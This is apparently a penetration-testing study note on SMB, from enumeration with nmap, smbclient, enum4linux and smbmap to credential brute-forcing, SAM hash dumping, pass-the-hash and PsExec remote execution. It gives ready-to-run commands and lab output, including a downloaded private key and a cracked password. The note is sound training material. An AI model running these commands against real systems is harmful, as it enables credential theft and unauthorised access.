---
created: 2025-09-15
---
## SMB

>**[SMB](https://en.wikipedia.org/wiki/Server_Message_Block) (Server Message Block)** is a network communication protocol used to share files, printers, serial ports, and other resources between devices on a network.

- SMB is mostly used in **Windows environments**, but also supported by other OS like Linux (via [Samba](https://en.wikipedia.org/wiki/Samba_(software))).
- SMB operates on a **client-server model** where clients send requests to servers to access shared resources.

>[!important] SMB primarily uses **TCP port `445`**.
>- Modern SMB runs directly over **TCP port `445`** directly.
>- Older versions uses NetBIOS over TCP or UDP ports `137`-`139`.

>[!note] To learn more about how SMB works, read [[྾_how_SMB_works|྾_how_SMB_works]].
## SMB enumeration

As with attacks against other protocols, SMB enumeration is the first thing you do. 
### Nmap

- SMB enumeration with version detection and default scripts:

```bash
sudo nmap -sV -sC -p 137-139,445 192.168.1.11
```

- User enumeration:

```bash
nmap --script smb-enum-shares -p 139,445 192.168.1.11
```

>[!example]+ Example: SMB Nmap scan
> 
> ```bash
> sudo nmap -sC -sV 10.129.203.6
> ```
> 
> ```bash
> Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-16 08:42 CDT
> Nmap scan report for 10.129.203.6
> Host is up (0.076s latency).
> Not shown: 995 closed tcp ports (reset)
> PORT     STATE SERVICE     VERSION
> # ...
> 139/tcp  open  netbios-ssn Samba smbd 4.6.2
> 445/tcp  open  netbios-ssn Samba smbd 4.6.2
> # ...
> 
> Host script results:
> |_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
> | smb2-time: 
> |   date: 2025-09-16T13:43:11
> |_  start_date: N/A
> | smb2-security-mode: 
> |   3:1:1: 
> |_    Message signing enabled but not required
> 
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 67.56 seconds
> ```

>[!important] Depending on the SMB implementation and the underlying operating system, Nmap will return different information. 
>- When targeting Windows, SMB version information is usually not included as part of Nmap scan results.
### SMB null sessions

SMB misconfigurations may allow **null session** access, which let users connect **without username or password** (they're simply left blank). With a null session, you can enumerate shares, users, groups, permissions, policies, and services on the target SMB server.

To check whether the SMB server allows null sessions, you can use `smbclient` (`-N` flag disables authentication prompt):

```bash
smbclient -N -L //192.168.1.11
```

>[!example]+ Example: SMB null session scan with `smbclient`
> ```bash
> smbclient -L //10.129.203.6 -N
> ```
> 
> ```bash
> 	Sharename       Type      Comment
> 	---------       ----      -------
> 	print$          Disk      Printer Drivers
> 	GGJ             Disk      Priv
> 	IPC$            IPC       IPC Service (attcsvc-linux Samba)
> ```

Alternatively, you can launch the `smb-enum-shares` NSE script, which attempts to list shares anonymously and report their access levels:

```bash
nmap --script smb-enum-shares -p 139,445 192.168.1.11
```

`rpcclient` can also be used to connect with null session:

```bash
rpcclient -U '%' 192.168.1.11 
```

### `enum4linux`

[`enum4linux`](https://www.kali.org/tools/enum4linux/) is a wrapper around Samba tools (`smbclient`, `rpcclient`, `net`, `nmblookup`) designed for comprehensive SMB enumeration.

`enum4linux` can retrieve:
- Domain and workgroup information 
- User accounts and RIDs (Relative IDs)
- Group memberships and descriptions
- Share names and permissions
- Password policies and account restrictions
- OS version and system information
- NetBIOS name tables (if used)

```bash
enum4linux -a 192.168.1.11
```

>[!tip] `-a` is a recommended starting point.

- Authenticated enumeration:

```bash
enum4linux -a -u USERNAME -p PASSWORD 192.168.1.11
```

| Option         | Description                                                                                                                      |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `-a`           | Perform all simple enumeration (`-U -S -G -P -r -o -n -i`).<br>Default if no options are provided.                               |
| `-U`           | Get list of users.                                                                                                               |
| `-M`           | Get machine list.                                                                                                                |
| `-S`           | Get list of shares.                                                                                                              |
| `-P`           | Get password policy information.                                                                                                 |
| `-G`           | Get group and member list.                                                                                                       |
| `-d`           | Detailed node (applies to `-U` and `-S`).                                                                                        |
| `-u USERNAME`  | Specify username to use (default blank).                                                                                         |
| `-p PASSWORD`  | Specify password to use (default blank).                                                                                         |
| `-r`           | Enumerate users via RID cycling.                                                                                                 |
| `-R`           | RID ranges to enumerate.                                                                                                         |
| `-s`           | Guess share names via brute-force.                                                                                               |
| `-k`           | Users that exist on the target system.<br>(default: `administrator`, `guest`, `krbtgt`, `domain admins`, `root`, `bin`, `none`). |
| `-o`           | Get OS information.                                                                                                              |
| `-i`           | Get printer information.                                                                                                         |
| `-w WORKGROUP` | Specify workgroup manually (usually found automatically).                                                                        |
| `-n`           | Do an `nmblookup` (similar to `nbtstat`).                                                                                        |
| `-v`           | Verbose output (show full commands being run).                                                                                   |
| `-A`           | Aggressive mode (e.g., perform write checks on shares, etc.)                                                                     |

### `smbclient`

[`smbclient`](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) provides an FTP-like interface for direct interaction with SMB shares. 

- List available SMB shares:

```bash
smbclient -L //192.168.1.11
```

```bash
smbclient -L //192.168.1.11 -U USERNAME%PASSWORD
```

- Suppress a normal password prompt:


```bash
smbclient -L //192.168.1.11 -N
```

- Anonymous access attempt:

```bash
smbclient -L //192.168.1.11 -U ""
```

```bash
smbclient -L //192.168.1.11 -U guest
```

- Connect to a specific share:

```bash
smbclient //192.168.1.11/SHARE_NAME
```

```bash
smbclient //192.168.1.11/SHARE_NAME -U USERNAME
```

- Force SMB version:

```bash
smbclient -L //192.168.1.11 -U USERNAME -m SMB2
```

```bash
smbclient -L //192.168.1.11 -U USERNAME -m SMB3
```

- Interactive `smbclient` commands:

```PowerShell
smb: \> ls                    # list directory contents
smb: \> get <filename>        # download file
smb: \> put <filename>        # upload file (if write access)
smb: \> cd <directory>        # change directory
smb: \> pwd                   # show current directory
smb: \> recurse ON            # enable recursive directory listing
smb: \> prompt OFF            # disable interactive prompts
smb: \> mget *                # download multiple files
```

### `smbmap`

`10.129.203.6`

[`smbmap`](https://github.com/ShawnDEvans/smbmap) is a tool designed for detailed SMB enumeration across large networks. It can enumerate share drives across an entire domain, list drive permissions, share contents, upload/download functionality, and much more. It can even execute remote commands. 

- Basic share enumeration:

```bash
smbmap -H 192.168.1.11
```

```bash
smbmap -H 192.168.1.11 -u USERNAME -p PASSWORD
```

>[!example]+ Example: SMB share enumeration
> ```bash
> smbmap -H 10.129.203.6
> ```
> 
> ```bash
> [+] IP: 10.129.203.6:445	Name: 10.129.203.6                                      
>         Disk                                                  	Permissions	Comment
> 	----                                                  	-----------	-------
> 	print$                                            	NO ACCESS	Printer Drivers
> 	GGJ                                               	READ ONLY	Priv
> 	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)
> ```


The `Permissions` column in the `smbmap` output denotes what you can do with the listed shares given the access level of the user you've compromised:
- `READ`: can read and download files from the share
- `WRITE`: can modify and upload files to the share
- `NO ACCESS`: can't access the share at all

The `READ` permissions allow you to list and download files from the share.

- Recursively list all files in a share:

```bash
smbmap -H 192.168.1.11 -s SHARE -r
```

>[!example]+ Example: Recursive file listing in an SMB share 
> 
> ```bash
> smbmap -H 10.129.203.6 -s GGJ -r
> ```
> 
> ```bash
> [+] IP: 10.129.203.6:445	Name: 10.129.203.6                                      
>         Disk                                                  	Permissions	Comment
> 	----                                                  	-----------	-------
> 	print$                                            	NO ACCESS	Printer Drivers
> 	GGJ                                               	READ ONLY	Priv
> 	.\GGJ\*
> 	dr--r--r--                0 Tue Apr 19 16:33:55 2022	.
> 	dr--r--r--                0 Mon Apr 18 12:08:30 2022	..
> 	fr--r--r--             3381 Tue Apr 19 16:33:03 2022	id_rsa
> 	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)
> ```

- Download a file from a share: 

```bash
smbmap -H 192.168.1.11 -s SHARE --download FILE
```

>[!example]+ Example: Download file from an SMB share
> 
> ```bash
> smbmap -H 10.129.203.6 -s GGJ -u 'jason' -p '34c8zuNBo91!@28Bszh' --download 'GGJ\id_rsa'
> ```
> 
> ```bash
> [+] Starting download: GGJ\id_rsa (3381 bytes)
> [+] File output to: /home/htb-ac-1908986/10.129.203.6-GGJ_id_rsa
> ```

With `WRITE` permissions, you can manage and upload files to the SMB client.

- Upload a file to a share:

```bash
smbmap -H 192.168.1.11 -s SHARE --upload LOCAL_FILE REMOTE_PATH
```

- Execute a command (requires admin access):

```bash
smbmap -H 192.168.1.11 -u USERNAME -p PASSWORD -x 'ipconfig'
```

| Option                      | Description                                                     |
| --------------------------- | --------------------------------------------------------------- |
| `-H`                        | IP address or domain of the target host.                        |
| `--host-file FILE`          | File with a list of hosts to scan.                              |
| `-u`, `--username USERNAME` | Specify username (if omitted, null session assumed).            |
| `-p`, `--password PASSWORD` | Password or NTLM hash (format: `LMHASH:NTHASH`).                |
| `--prompt`                  | Prompt for a password.                                          |
| `-s SHARE`                  | Specify a share (default `C$`).                                 |
| `-d DOMAIN`                 | Domain name (default `WORKGROUP`).                              |
| `-P PORT`                   | SMB port (default `445`).                                       |
| `-v`, `--version`           | Return the OS version of the remote host.                       |
| `--signing`                 | Check for SMB signing support (enabled, disabled, or required). |
| `--admin`                   | Report is the user is an admin.                                 |
| `--no-banner`               | Don't display tool banner.                                      |
| `--no-color`                | Remove colors from output.                                      |
| `--no-update`               | Remove "Working on it" message.                                 |
| `--timeout`                 | Scan timeout (default is 0.5 seconds).                          |
| `-k`, `--kerberos`          | Use Kerberos authentication.                                    |
| `-x COMMAND`                | Execute a command (requires admin access)                       |
| `-L`                        | Lists all drives on the specified host (requires admin access). |
| `-r [PATH]`                 | Recursively list directories and files.                         |
| `-g FILE`                   | Output to a file in a grep-friendly format.                     |
| `--download PATH`           | Download a file from the remote system.                         |
| `--upload SRC DST`          | Upload a file to the remote system.                             |
| `--delete PATH`             | Delete a remote file.                                           |
|                             |                                                                 |

## Brute-forcing SMB credentials

If SMB null session is not allowed, you can try brute-forcing SMB credentials. 
You can use the [`CrackMapExec`](https://github.com/byt3bl33d3r/CrackMapExec) (CME) tool for this purposes.

- To brute-force SMB usernames and passwords:

```bash
crackmapexec smb 192.168.1.11 -u usernames.txt -p passwords.txt --local-auth
```

See [[྾_brute-force]]

>[!example]+ Example: Cracking SMB password with CME
> ```bash
> crackmapexec smb 10.129.203.6 -u "jason" -p pws.list --local-auth
> ```
> 
> ```bash
> SMB         10.129.203.6    445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:False)
> SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE
> SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:theman STATUS_LOGON_FAILURE
> SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:bandit STATUS_LOGON_FAILURE
> # ...
> SMB         10.129.203.6    445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh 
> ```

>[!tip]
>By default, CME exits as soon as it finds a successful login. To continue brute-force even after that to find additional users and passwords, add the `--continue-on-success` option to the command.

## Attacking SMB

When attacking SMB, your actions will be limited by the privileges of the user you managed to compromise. 

An administrator user can perform operations such as:
- Extract hashes from SAM database
- Enumerate logged-in users
- Pass-the-Hash (PtH)
- Remote Code Execution (RCE)

## Extracting hashes from the SAM database

**[SAM](https://en.wikipedia.org/wiki/Security_Account_Manager) (Security Account Manager)** is a database file that stores password hashes for user accounts on Windows. It can be used to authenticate local and remote users. 

>[!note]+ The structure of the database file is as follows:
> 
> ```bash
> Username:RID:LM_Hash:NT_Hash:::
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> ```

>[!interesting] By default, the SAM database file can be found at `C:\Windows\System32\config\SAM`.

With admin access to SMB, you can extract hashes from the SAM database. With these hashes, you can:
- Authenticate as another user.
- Crack the password and reuse it for other services or accounts.
- Pass the Hash (PtH); see [[#Pass-the-Hash (PtH)]] section.

`CrackMapExec` tool comes helpful here as well. To extract hashes from the SAM file, use the `--sam` option:

```bash
crackmapexec smb 192.168.1.11 -u administrator -p PASSWORD --sam
```

## Pass-the-Hash (PtH)

>The **Pass-the-Hash (PtH)** attack exploits a fundamental weakness in Windows NTLM authentication protocol that allows an attacker to authenticate to a Windows system using a password hash instead of a plaintext password. This eliminates the need for password cracking. 

**Windows password shares are "password equivalent"**. 
- From an authentication perspective, possessing the hash is equivalent to knowing the password.
- NTLM hashes are not salted; identical password produce identical hashes. 
- Hashes can be used directly in NTLM authentication without conversion.

>[!note]+
> To read more, see:
> - [`Pass the hash — Wikipedia`](https://en.wikipedia.org/wiki/Pass_the_hash)
> - [`NTLM — Wikipedia`](https://en.wikipedia.org/wiki/NTLM)

You can perform the attack with tools like `smbmap`, `CrackMapExec`, or any `Impacket` tool. 

Here's an example with CME:

```bash
crackmapexec smb 192.168.1.11 -u USERNAME -H PASSWORD_HASH
```

```bash
crackmapexec smb 10.129.203.6 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

## Forced authentication attacks

Pretending SMB server and capturing NTLM hashes.

## RCE

SMB can be used to **execute commands on a remote system** (**RCE — Remote Code Execution**).

The [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/) suite, developed by [Mark Russinovich](https://en.wikipedia.org/wiki/Mark_Russinovich) and [Bryce Cogswell](https://en-academic.com/dic.nsf/enwiki/2358707) back in 1996, provides a set of technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows Environment. These tools are freely available to everyone.

One of them is **[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)**. It allows you to **remotely execute processes on Windows hosts, without having to install any additional client software**.

PsExec works by first deploying a Windows service executable to the `admin$` SMB share on the the target server, and then using DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec services on the remote machine. This PSExec service then creates a [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system.

PsExec can be downloaded on Windows from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec). 

Alternatively, you can use one of its Linux implementations:

- [`Impacket PsExec`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
	- Python PsExec-like functionality example using [`RemComSvc`](https://github.com/kavika13/RemCom).
- [`Impacket SMBExec`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
	- Implements a similar approach to PsExec but without using [`RemComSvc`](https://github.com/kavika13/RemCom) (read more about this technique [here](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access)). In short, it instantiates a local SMB server to receive command output, which is useful when the target machine doesn't have any writable shares available.
- [`Impacket atexec`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) 
	- Executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [`CrackMapExec`](https://github.com/byt3bl33d3r/CrackMapExec) 
	- Includes an implementation of `smbexec` and `atexec`.
- [`Metasploit PsExec`](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) 
	- PsExec implementation written in Ruby.

For example, here's how you can connect to a remote machine with `impacket-psexec` (requires admin access):

```bash
impacket-psexec administrator:'password'@192.168.1.11
```
### Enumerating logged-in users


## RPC

For `rpcclient` commands, see:
- [`rpclient man page`](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) 
- [`SMB Access from Linux Cheat Sheet`](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)
## References and further reading

- [`A Little Guide to SMB Enumeration — Hacking Articles`](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)

- [`Microsoft SMB Protocol Authentication — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-authentication)
- [`What is the Server Message Block (SMB) protocol?`](https://www.techtarget.com/searchnetworking/definition/Server-Message-Block-Protocol)
- [`Server Message Block — Wikipedia`](https://en.wikipedia.org/wiki/Server_Message_Block)
- [`Samba — Wikipedia`](https://en.wikipedia.org/wiki/Samba_(software))

- [`Pass the hash — Wikipedia`](https://en.wikipedia.org/wiki/Pass_the_hash)
- [`NTLM — Wikipedia`](https://en.wikipedia.org/wiki/NTLM)

---



### RPC and SMB

>**[RPC](https://en.wikipedia.org/wiki/Remote_procedure_call) (Remote Procedure Call)** is a communication protocol that allows a program to execute a procedure (subroutine) on a remote system as if it were a normal local procedure call.

- RPC operates on a client-server model:
	- The client initiates requests by calling what appears to be a local function.
	- The server receives request, executes the requested procedures, and returns the results.

RPC clients don't even need to understand the underlying network details or change the code.

>[!interesting]+ RPC workflow
>
> 1. **Client calls a stub** — a local procedure that acts as a proxy.
> 2. **Marshalling** — parameters are serialized into the format that can be transmitted over the network.
> 3. **Network transmission** — the request is sent to server. 
> 4. **Server stub** — unpacks (unmarshals) the request. 
> 5. **Procedure execution** — the server runs the actual function. 
> 6. **Response marshalling** — the results are packaged for network transmission back to the client. 
> 7. **Client receives response** — the client unpacks the results and returns them to the calling program.

>**[Microsoft RPC](https://en.wikipedia.org/wiki/Microsoft_RPC) (MSRPC)** is Microsoft's implementation based on the **Distributed Computing Environment (DCE) RPC standard** from the Open Software Foundation.

But how is RPC related to SMB?

>**[MS-RPCE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15)** defines **RPC over SMB** that can use SMB protocol **named pipes** — a method of IPC (Inter-Process Communication) — as its underlying transport.

RPC over SMB works as follows:
1. The client connects to the SMB server (TCP port `445` or `139`) as normal, and connects to the **`IPC$` administrative share**.
2. The client then opens a specific named pipe, such as `\samr`, `\lsarpc`, `\srvsvc`, `\winreg`, or `\netlogon`. Each pipe corresponds to specific Windows services and functions.

### `rpcclient`

**`rpcclient`** is a **Linux-based utility** (part of Samba suite) that enables direct interaction with Windows RPC services over SMB. 

## To be done
- `rpcclient` examples
- enumerating logged-in users with CME
- RCE with `Impacket`
- PtH
